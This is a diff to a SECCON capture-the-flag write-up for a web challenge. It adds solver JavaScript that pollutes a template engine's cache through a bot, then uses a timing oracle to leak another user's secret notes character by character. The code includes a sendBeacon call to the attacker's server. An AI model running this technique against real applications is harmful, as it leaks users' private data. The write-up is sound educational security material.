@@ -1567,7 +1567,7 @@ To construct the oracle, you need to let the bot render the following `text` as 
 ```javascript
 const i = /* An index `i` where you want to leak the i-th character */;
 const user = /* A User object of the bot */;
-const text = "{{x}}".repeat(20000) + user.getNotes()[i];
+const text = `${i}-${user.getNotes()[i]}-${"{{x}}".repeat(20000)}`;
 ```
 
 Btw, the `deleteNote` function uses `Array.prototype.splice` to delete a note:
@@ -1612,7 +1612,73 @@ Proxy [ [ '1', '3x' ], { get: [Function: get] } ]
 
 When `notes.splice(1, 1)` was executed, the `get` handler of Proxy was **implicitly** called and `"3"` changed to `"3x"`. So, the final result of `notes[1]` was `"3xx"` because the `get` handler was called again.
 
-My solution uses the above behavior to construct a time-based oracle. See my solver for details.
+My solution abuses the above behavior to construct a time-based oracle.
+
+Firstly, my solver lets the bot pollute cache in the template engine (`index.html`):
+```javascript
+    const polluteCache = async (flagIndex) => {
+      const evilNote = `${flagIndex}-{{notes.${flagIndex}}}-{{emoji}}`;
+      createNote("dummy");
+      await sleep(500);
+      createNote(evilNote);
+      await sleep(500);
+      deleteNote(MAX_FLAG_LENGTH);
+      await sleep(1000);
+      deleteNote(MAX_FLAG_LENGTH);
+      await sleep(1000);
+    }
+
+    const main = async () => {
+      const heavyTemplate = "{{x}}".repeat(HEAVY_LEVEL);
+      changeEmoji(heavyTemplate);
+      await sleep(1000);
+
+      const known = "SECCON{";
+      for (let i = known.length; i<MAX_FLAG_LENGTH; i++) {
+        await polluteCache(i);
+      }
+      navigator.sendBeacon(`${location.origin}/start-leak`);
+    };
+    main();
+```
+
+Next, my solver leaks the flag using the time-based oracle (`index.js`):
+```javascript
+const leak = async (flagIndex, cookie) => {
+  let minTime = 1e10;
+  let minChar;
+  for (const char of CHARS) {
+    const note = `${flagIndex}-${char}-${"{{x}}".repeat(HEAVY_LEVEL)}`;
+    await createNote(note, cookie);
+    const time = await measureTime(cookie);
+    await deleteNote(0, cookie);
+    if (time < minTime) {
+      minTime = time;
+      minChar = char;
+    }
+  }
+  if (!minChar) fail(`Failed at ${flagIndex}`);
+
+  return minChar;
+};
+
+const exploit = async () => {
+  /* snip */
+  const cookie = /* snip (a cookie of your account) */;
+
+  let prefix = "SECCON{";
+  while (!prefix.endsWith("}")) {
+    prefix += await leak(prefix.length, cookie);
+    console.log(prefix);
+    await sleep(500);
+  }
+
+  console.log(`Flag: ${prefix}`);
+  process.exit(0);
+};
+```
+
+See my solver below for details.
 
 ### Solver
 
